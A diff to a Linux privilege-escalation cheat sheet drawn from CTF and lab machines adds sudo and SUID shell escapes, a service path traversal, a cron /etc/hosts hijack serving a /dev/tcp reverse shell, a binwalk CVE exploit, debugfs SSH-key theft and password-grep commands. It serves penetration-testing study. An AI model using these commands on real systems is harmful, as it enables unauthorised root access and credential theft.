@@ -16,13 +16,15 @@ Linux privilege escalation is consistently the decisive phase in CTF machines an
 | Category | Techniques |
 |---|---|
 | Enumeration | LinPEAS, LinEnum, manual checklist |
-| sudo abuse | NOPASSWD GTFOBins, LD_PRELOAD, writable scripts |
-| SUID abuse | find, gdb, python, base64, systemctl, bash |
+| sudo abuse | NOPASSWD GTFOBins, LD_PRELOAD, writable scripts, service path traversal |
+| SUID abuse | find, gdb, python, php, strace, base64, systemctl, bash |
 | Capabilities | cap_setuid (python2/3), cap_net_admin |
-| Cron jobs | Writable script, wildcard injection (tar) |
+| Cron jobs | Writable script, wildcard injection (tar), DNS hijack + curl pipe bash, vulnerable tool CVE |
 | File permission | Writable /etc/passwd, readable /etc/shadow |
 | Service abuse | MySQL UDF, running-as-root services |
 | Container escape | LXD/LXC, Docker group |
+| disk group | debugfs → read raw device → SSH key extraction |
+| Credential reuse | Config files, service DBs, pspy + credential harvest |
 | Kernel exploits | Dirty COW (CVE-2016-5195), others |
 | Misc | NFS no_root_squash, PATH hijacking |
 
@@ -67,16 +69,20 @@ flowchart TD
 
 | Vector | Detection command | Exploitability | Seen in |
 |---|---|---|---|
-| sudo NOPASSWD | `sudo -l` | Instant if GTFOBins binary | Simple CTF, Jordak, Loly, Sunday |
-| SUID abuse | `find / -perm -4000 -type f` | One-liner via GTFOBins | Gaara, Jarvis, Linux PrivEsc |
+| sudo NOPASSWD | `sudo -l` | Instant if GTFOBins binary | Simple CTF, Jordak, BBScute, Daily Bugle, Sunday, StuxCTF |
+| SUID abuse | `find / -perm -4000 -type f` | One-liner via GTFOBins | Gaara, Astronaut, Image, Jarvis, Linux PrivEsc |
 | cap_setuid | `getcap -r / 2>/dev/null` | One-liner (python/perl) | Levram, Katana |
-| Cron writable | `cat /etc/crontab; ls -la <script>` | Append reverse shell | GlasgowSmile, Law |
-| Cron wildcard | `cat /etc/crontab` | File-name injection | Linux PrivEsc |
+| Cron writable | `cat /etc/crontab; ls -la <script>` | Append reverse shell | GlasgowSmile, Law, Ochima, Funbox, Solidstate |
+| Cron wildcard | `cat /etc/crontab` | File-name injection | Linux PrivEsc, Cockpit, Funboxeasyenum |
+| Cron DNS hijack | `cat /etc/crontab` + check `/etc/hosts` | /etc/hosts + curl pipe bash | Overpass |
+| Cron + tool CVE | `cat /etc/crontab` + tool version | RCE via tool vuln | HTB Pilgrimage (binwalk) |
 | LXD group | `id` → `lxd` group | Container mount to /mnt/root | Tabby |
+| disk group | `id` → `disk` group | debugfs → raw device read | Extplorer, Fanatastic |
 | MySQL UDF | Running as root, plugin dir writable | Custom .so → RCE | Linux PrivEsc |
-| Dirty COW | `uname -r` (< 4.8.3) | Race condition overwrite | Linux PrivEsc |
+| Dirty COW | `uname -r` (< 4.8.3) | Race condition overwrite | Linux PrivEsc, Driftingblue6 |
 | LD_PRELOAD | `sudo -l` env_keep | Inject .so into sudo process | Linux PrivEsc |
 | Readable shadow | `ls -la /etc/shadow` | Offline hash crack (john) | Linux PrivEsc |
+| Credential reuse | Config files, service DBs | su / SSH with found password | Codo, Fired, Btrsys2, Mr Robot, Mantis |
 
 ---
 
@@ -161,7 +167,11 @@ Common binaries and their escape commands:
 | `nano` | `sudo nano`, then `^R^X` → `reset; sh 1>&0 2>&0` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
 | `less` | `sudo less /etc/passwd`, then `!/bin/bash` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
 | `python` | `sudo python -c 'import os; os.system("/bin/bash")'` | Multiple |
-| `bash` | `sudo bash` | — |
+| `bash` | `sudo bash` | [StuxCTF](/posts/thm-stuxctf/) |
+| `wget` | `TF=$(mktemp); echo '#!/bin/sh\n/bin/bash' > $TF; chmod +x $TF; sudo wget --use-askpass=$TF http://127.0.0.1` | [HTB Sunday](/posts/htb-sunday/) |
+| `yum` | `TF=$(mktemp -d); echo $'[main]\nplugins=1' > $TF/yum.conf; echo $'[id]\nname=p\nplugin_path='$TF'\n[...]' > ...; sudo yum -c $TF/yum.conf` | [Daily Bugle](/posts/thm-daily-bugle/) |
+| `hping3` | `sudo hping3 --icmp target`, then at `hping3>` prompt: `/bin/sh -p` | [BBScute](/posts/pg-bbscute/) |
+| `strace` | `sudo strace -o /dev/null /bin/sh -p` | [Image](/posts/pg-image/) (SUID) |
 
 ```mermaid
 flowchart LR
@@ -211,6 +221,20 @@ sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
 Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)
+
+### 1d. sudo service — Path Traversal
+
+If `sudo /usr/sbin/service` is allowed without a password, the service name argument can be used as a path traversal to execute an arbitrary binary:
+
+```bash
+# sudoers: (root) NOPASSWD: /usr/sbin/service
+sudo /usr/sbin/service ../../bin/bash
+# Root shell
+```
+
+The `service` command ultimately calls `/etc/init.d/<arg>` — by injecting `../../bin/bash` as the argument, execution reaches `/bin/bash` as root.
+
+Seen in: [Crane](/posts/pg-crane/)
 
 ---
 
@@ -272,6 +296,24 @@ WantedBy=multi-user.target' > $TF
 systemctl link $TF
 systemctl enable --now $TF
 # Then: /bin/bash -p
+```
+
+**`php` with SUID** ([Astronaut](/posts/pg-astronaut/)):
+```bash
+php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+```
+
+**`strace` with SUID** ([Image](/posts/pg-image/)):
+```bash
+strace -o /dev/null /bin/sh -p
+# strace runs as root (SUID), spawns /bin/sh inheriting root
+```
+
+**`hping3` with SUID:**
+```bash
+# At the hping3 interactive prompt:
+hping3
+hping3> /bin/sh -p
 ```
 
 > **Reference**: Always check [GTFOBins](https://gtfobins.github.io/) for every unusual SUID binary. The project catalogs hundreds of abuse paths.
@@ -363,7 +405,7 @@ touch -- '--checkpoint-action=exec=shell.elf'
 nc -nlvp 4444
 ```
 
-Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)
+Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/), [Cockpit](/posts/pg-cockpit/), [Funboxeasyenum](/posts/pg-funboxeasyenum/)
 
 ```mermaid
 sequenceDiagram
@@ -376,6 +418,55 @@ sequenceDiagram
     TAR->>SH: exec shell.elf (as root)
     SH-->>CR: Reverse shell to attacker
 ```
+
+### 4c. Cron + /etc/hosts DNS Hijack
+
+If a cron job runs `curl http://<hostname>/script.sh | bash` and the hostname is in `/etc/hosts` (writable), you can redirect the curl request to your own server.
+
+```bash
+cat /etc/crontab
+# * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+# Check /etc/hosts permissions
+ls -la /etc/hosts
+# -rw-rw-rw- 1 root root /etc/hosts   ← writable!
+
+# Redirect the hostname to attacker IP
+echo '10.10.14.5 overpass.thm' >> /etc/hosts
+
+# On attacker: serve a reverse shell
+mkdir -p /var/www/html/downloads/src/
+echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /var/www/html/downloads/src/buildscript.sh
+python3 -m http.server 80
+
+nc -nlvp 4444
+# Wait for cron → root shell
+```
+
+Seen in: [Overpass](/posts/thm-overpass/)
+
+### 4d. Cron + Vulnerable Tool (CVE Abuse)
+
+If a cron job executes a tool with a known CVE, exploit the vulnerability to get RCE as root.
+
+```bash
+# cron: * * * * * root /usr/sbin/malwarescan.sh
+cat /usr/sbin/malwarescan.sh
+# #!/bin/bash
+# ... uses binwalk to scan uploaded files
+
+# Check binwalk version
+binwalk --help | head -3
+# Binwalk v2.3.2   ← CVE-2022-4510 (path traversal RCE)
+
+# Create a malicious PNG with embedded payload
+# The CVE allows writing a .so to a known path during extraction
+python3 binwalk_CVE-2022-4510.py malicious.png <attacker_ip> <port>
+nc -nlvp 4444
+# Drop malicious file to the scanned directory, wait for cron
+```
+
+Seen in: [HTB Pilgrimage](/posts/htb-pilgrimage/) (binwalk CVE-2022-4510)
 
 ---
 
@@ -496,7 +587,70 @@ flowchart LR
 
 ---
 
-## 9. Kernel Exploits — Dirty COW (CVE-2016-5195)
+## 9. disk Group — debugfs Raw Device Access
+
+If the current user is in the `disk` group, they can use `debugfs` to read raw block devices — including the root filesystem. This allows direct extraction of files like `/root/.ssh/id_rsa` without filesystem permission checks.
+
+```bash
+id
+# uid=1000(user) gid=1000(user) groups=1000(user),6(disk)
+
+# List block devices
+lsblk
+# NAME                      MAJ:MIN RM  SIZE
+# sda                         8:0    0   20G  0 disk
+# └─ubuntu--vg-ubuntu--lv   253:0    0   20G  0 lvm
+
+# Open the volume with debugfs
+debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+
+# Extract root's SSH private key
+debugfs: cat /root/.ssh/id_rsa
+# -----BEGIN OPENSSH PRIVATE KEY-----
+# ...
+
+# Save and use
+chmod 600 id_rsa
+ssh -i id_rsa root@localhost
+```
+
+Seen in: [Extplorer](/posts/pg-extplorer/), [Fanatastic](/posts/pg-fanatastic/)
+
+---
+
+## 10. Credential Reuse from Config Files
+
+One of the most underrated but frequently successful vectors: applications store plaintext or weakly-hashed credentials in config files. After gaining a low-privilege shell, always grep for passwords.
+
+```bash
+# Common config locations
+grep -r "password\|passwd\|secret\|credential" /var/www/html/ 2>/dev/null
+grep -r "DB_PASS\|db_password\|db_pass" /var/www/ 2>/dev/null
+find / -name "*.conf" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
+
+# Found a password → try su
+su root
+su <other_user>
+
+# Try SSH reuse
+ssh root@localhost -p 22
+```
+
+**Process monitoring with pspy** — catches credentials passed on the command line:
+```bash
+./pspy64   # or pspy32
+# Watch for: mysqldump, cron scripts, scripts with --password= flags
+```
+
+Real cases:
+- [Codo](/posts/pg-codo/): `/var/www/html/sites/default/config.php` → password `FatPanda123` → `su root`
+- [Fired](/posts/pg-fired/): Openfire DB → password → `su root`
+- [Btrsys2-1](/posts/pg-btrsys2-1/): direct `su -` with password `roottoor`
+- [Mantis](/posts/pg-mantis/): `mysqldump` in pspy → password → pivot to `sudo -l` full access
+
+---
+
+## 11. Kernel Exploits — Dirty COW (CVE-2016-5195)
 
 Kernel exploits are a last resort — noisy and can crash the system. Check the kernel version first.
 
@@ -525,7 +679,7 @@ Seen in: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)
 
 ---
 
-## 10. NFS no_root_squash
+## 12. NFS no_root_squash
 
 If a share is exported with `no_root_squash`, a remote root user can write SUID files to that share:
 
@@ -548,7 +702,7 @@ chmod +xs /mnt/nfs/bash
 
 ---
 
-## 11. PATH Hijacking
+## 13. PATH Hijacking
 
 If a SUID binary or sudo-allowed script calls a command **without an absolute path**, create a malicious binary with the same name in a directory earlier in `$PATH`:
 
@@ -630,18 +784,28 @@ flowchart TD
 
 | Technique | Machines |
 |---|---|
-| sudo GTFOBins (vim/find/env/nano/less) | [Simple CTF](/posts/thm-simple-ctf/), [Jordak](/posts/pg-jordak/), [Linux PrivEsc](/posts/thm-linux-privilege-escalation/) |
-| sudo writable script | [HTB Codify](/posts/htb-codify/), [Jarvis](/posts/htb-jarvis/) |
+| sudo GTFOBins (vim/find/env/nano/less/bash) | [Simple CTF](/posts/thm-simple-ctf/), [Jordak](/posts/pg-jordak/), [StuxCTF](/posts/thm-stuxctf/), [Linux PrivEsc](/posts/thm-linux-privilege-escalation/) |
+| sudo GTFOBins (wget/yum) | [HTB Sunday](/posts/htb-sunday/), [Daily Bugle](/posts/thm-daily-bugle/) |
+| sudo GTFOBins (hping3/strace) | [BBScute](/posts/pg-bbscute/), [Image](/posts/pg-image/) |
+| sudo service path traversal | [Crane](/posts/pg-crane/) |
+| sudo writable script | [HTB Codify](/posts/htb-codify/), [HTB Nibbles](/posts/htb-nibbles/), [Jarvis](/posts/htb-jarvis/) |
 | sudo LD_PRELOAD | [Linux PrivEsc](/posts/thm-linux-privesc/) |
 | SUID gdb | [Gaara](/posts/pg-gaara/) |
+| SUID php | [Astronaut](/posts/pg-astronaut/) |
+| SUID strace | [Image](/posts/pg-image/) |
 | SUID systemctl | [HTB Jarvis](/posts/htb-jarvis/) |
 | SUID base64 | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
+| SUID find / custom find wrapper | [Nibbles (PG)](/posts/pg-nibbles/), [Mzeeav](/posts/pg-mzeeav/) |
 | cap_setuid python | [Levram](/posts/pg-levram/), [Katana](/posts/pg-katana/) |
-| Cron writable script | [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/) |
-| Cron wildcard (tar) | [Linux PrivEsc](/posts/thm-linux-privesc/) |
+| Cron writable script | [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/), [Ochima](/posts/pg-ochima/), [Funbox](/posts/pg-funbox/), [Flu](/posts/pg-flu/), [HTB Solidstate](/posts/htb-solidstate/) |
+| Cron wildcard (tar) | [Linux PrivEsc](/posts/thm-linux-privesc/), [Cockpit](/posts/pg-cockpit/), [Funboxeasyenum](/posts/pg-funboxeasyenum/) |
+| Cron DNS hijack (/etc/hosts) | [Overpass](/posts/thm-overpass/) |
+| Cron + tool CVE (binwalk) | [HTB Pilgrimage](/posts/htb-pilgrimage/) |
+| disk group + debugfs | [Extplorer](/posts/pg-extplorer/), [Fanatastic](/posts/pg-fanatastic/) |
+| Credential reuse from configs | [Codo](/posts/pg-codo/), [Fired](/posts/pg-fired/), [Btrsys2-1](/posts/pg-btrsys2-1/), [Mantis](/posts/pg-mantis/) |
 | LXD container escape | [HTB Tabby](/posts/htb-tabby/) |
 | MySQL UDF | [Linux PrivEsc](/posts/thm-linux-privesc/) |
-| Kernel (Dirty COW) | [Linux PrivEsc](/posts/thm-linux-privesc/) |
+| Kernel (Dirty COW) | [Linux PrivEsc](/posts/thm-linux-privesc/), [Driftingblue6](/posts/pg-driftingblue6/) |
 | Password hash cracking | [Linux PrivEsc](/posts/thm-linux-privesc/), [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
 
 ---
@@ -663,5 +827,6 @@ flowchart TD
 - [LinPEAS](https://github.com/peass-ng/PEASS-ng) — Linux Privilege Escalation Awesome Script
 - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
 - [CVE-2016-5195 (Dirty COW)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)
-- **Related writeups**: [Simple CTF](/posts/thm-simple-ctf/), [Gaara](/posts/pg-gaara/), [Levram](/posts/pg-levram/), [Katana](/posts/pg-katana/), [Jordak](/posts/pg-jordak/), [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/), [Linux PrivEsc](/posts/thm-linux-privesc/), [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/), [HTB Tabby](/posts/htb-tabby/), [HTB Jarvis](/posts/htb-jarvis/), [HTB Codify](/posts/htb-codify/)
+- [CVE-2022-4510 (binwalk RCE)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4510)
+- **Related writeups**: [Simple CTF](/posts/thm-simple-ctf/), [Gaara](/posts/pg-gaara/), [Levram](/posts/pg-levram/), [Katana](/posts/pg-katana/), [Jordak](/posts/pg-jordak/), [GlasgowSmile](/posts/pg-glasgowsmile/), [Law](/posts/pg-law/), [Ochima](/posts/pg-ochima/), [Funbox](/posts/pg-funbox/), [Overpass](/posts/thm-overpass/), [BBScute](/posts/pg-bbscute/), [Crane](/posts/pg-crane/), [Astronaut](/posts/pg-astronaut/), [Image](/posts/pg-image/), [Extplorer](/posts/pg-extplorer/), [Fanatastic](/posts/pg-fanatastic/), [Codo](/posts/pg-codo/), [Mantis](/posts/pg-mantis/), [Driftingblue6](/posts/pg-driftingblue6/), [Linux PrivEsc](/posts/thm-linux-privesc/), [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/), [HTB Tabby](/posts/htb-tabby/), [HTB Jarvis](/posts/htb-jarvis/), [HTB Codify](/posts/htb-codify/), [HTB Pilgrimage](/posts/htb-pilgrimage/), [HTB Sunday](/posts/htb-sunday/), [Daily Bugle](/posts/thm-daily-bugle/)
 - **Related tech posts**: [SUID find Deep Dive](/posts/tech-suid-find-privesc/)
